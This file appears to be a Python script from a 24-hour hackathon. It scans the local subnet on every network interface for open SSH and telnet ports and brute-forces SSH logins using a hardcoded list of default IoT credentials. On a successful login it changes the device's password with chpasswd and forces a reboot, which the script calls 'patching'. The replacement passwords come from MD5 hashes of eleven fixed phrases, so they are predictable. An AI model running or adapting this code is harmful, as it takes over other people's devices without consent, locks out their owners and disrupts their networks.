import time
import netifaces
import sys
import subprocess
import re
import base64
import paramiko
from paramiko.ssh_exception import AuthenticationException, SSHException, BadHostKeyException
import socket
from netaddr import IPNetwork
import hashlib
import random

def newPass():
	listOfFun = ['we just used random strings', 'there\'s really nothing special about', 'our random password gen procedure',
		    'but oh well, we had 24 hours', 'and it works, which is what counts', 'so', 'here\'s', 'some', 'random', 
		     'strings', 'for the project']

	pickedWord = listOfFun[random.randint(0,10)]
	hashedWord = hashlib.md5(pickedWord.encode())

	goodPass = "G" + hashedWord.hexdigest()
	return goodPass

passwords = ('root', 'xc3511'), ('root', 'vizxv'), ('root', 'admin'), ('admin', 'admin'), ('root', '888888'), ('root', 'xmhdipc'), ('root', 'default'), ('root', 'juantech'), ('root', '123456'), ('root', '54321'), ('support', 'support'), ('root', ''), ('admin', 'password'), ('root', 'root'), ('root', '12345'), ('user', 'user'), ('admin', '(none)'), ('root', 'pass'), ('admin', 'admin1234'), ('root', '1111'), ('admin', 'smcadmin'), ('admin', '1111'), ('root', '666666'), ('root', 'password'), ('root', '1234'), ('root', 'klv123'), ('Administrator', 'admin'), ('service', 'service'), ('supervisor', 'supervisor'), ('guest', 'guest'), ('guest', '12345'), ('guest', '12345'), ('admin1', 'password'), ('administrator', '1234'), ('666666', '666666'), ('888888', '888888'), ('ubnt', 'ubnt'), ('root', 'klv1234'), ('root', 'Zte521'), ('root', 'hi3518'), ('root', 'jvbzd'), ('root', 'anko'), ('root', 'zlxx.'), ('root', '7ujMko0vizxv'), ('root', '7ujMko0admin'), ('root', 'system'), ('root', 'ikwb'), ('root', 'dreambox'), ('root', 'user'), ('root', 'realtek'), ('root', '00000000'), ('admin', '1111111'), ('admin', '1234'), ('admin', '12345'), ('admin', '54321'), ('admin', '123456'), ('admin', '7ujMko0admin'), ('admin', '1234'), ('admin', 'pass'), ('admin', 'meinsm'), ('tech', 'tech'), ('mother', 'fucker')

def scanRange(interface, address, CIDR):
	print('[*] IT BEGINS: Starting scan via interface ' + interface)
	print('[*] Checking if any devices have SSH or telnet open')

	vulnerables = []
	
	for ip in IPNetwork(address + '/' + str(CIDR)):
		# Check for SSH port open
		print('[*] Trying IP ' + str(ip) + ' for SSH')
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.settimeout(2)
		sshResult = sock.connect_ex((str(ip), 22))

		if sshResult == 0:
			# SSH port is open, we now brute
			print('[*] SSH port is open on ' + str(ip))

			passwordAttempts = 0
			for tuples in passwords:
				passwordAttempts = passwordAttempts + 1
				print('[*] Password attempt ' + str(passwordAttempts) + ' on device ' + str(ip))

				try:
					client = paramiko.SSHClient()
					client.load_system_host_keys()
					client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
					client.connect(str(ip), username=tuples[0], password=tuples[1], timeout=3)

					print('[*] Device ' + str(ip) + ' is vulnerable, patching now!')

					print('[*] Changing device password')
					newPassword = newPass()
					client.exec_command('echo "' + str(tuples[0]) + ':' + newPassword + '" | chpasswd')

					print('[*] Forcing device reboot')
					client.exec_command('reboot now')

					vulnerables.append((str(ip), str(newPassword)))
					client.close()

					break

				except AuthenticationException:
					continue
				except SSHException as sshException:
					break
				except BadHostKeyException as badHostKeyException:
					break
				except Exception as e:
					break

		else:
			print('[*] Trying IP ' + str(ip) + ' for telnet')

			telnetResult = sock.connect_ex((str(ip), 23))
			if telnetResult == 0:
				print('[*] Telnet was accessible on ' + str(ip))

				# We have telnet, let's try to login
				# This is reserved for later

				NotImplemented

		sock = None

	print('[*] Network scanned!')	
	for newStuff in vulnerables:
		print('Device ' + str(newStuff[0]) + ' password changed to: ' + str(newStuff[1]))

print('888    d8P         d8888 888    d8P   .d88888b.')
print('888   d8P         d88888 888   d8P   d88P" "Y88b ')
print('888  d8P         d88P888 888  d8P    888     888 ')
print('888d88K         d88P 888 888d88K     888     888 ')
print('8888888b       d88P  888 8888888b    888     888 ')
print('888  Y88b     d88P   888 888  Y88b   888     888 ')
print('888   Y88b   d8888888888 888   Y88b  Y88b. .d88P ')
print('888    Y88b d88P     888 888    Y88b  "Y88888P"')

for interface in netifaces.interfaces():
	currentInterface = netifaces.ifaddresses(interface).get(netifaces.AF_INET) # For IPv6 support, use flag AF_INET6
	
	# Do we care about this interface?
	if currentInterface != None:
		address = currentInterface[0]['addr']

		if address in ['127.0.0.1']:
			continue

		# Calculate the CIDR from the mask, usual high bits method
		CIDR = 0;
		for piece in currentInterface[0]['netmask'].split('.'):
			binStringCount = "{0:b}".format(int(piece)).count('1')
			CIDR = CIDR + binStringCount

		# If CIDR < /24, are you sure you want to scan a network that big?
		while(1):
			if CIDR < 24:
				response = input('Interface "' + interface +  '" is attached to a network of CIDR size /' + str(CIDR) + ' which is pretty huge.\nAre you sure you want to scan a range that big? It WILL take multiple hours! (Y/n) ')
			else:
				response = input('The network connected to interface "' + interface + '" is ready to be scanned.\nDo you want to scan this network? (Y/n) ')
			break

		if (response == 'y' or response == 'Y'):
			scanRange(interface, address, CIDR)
		else:
			continue
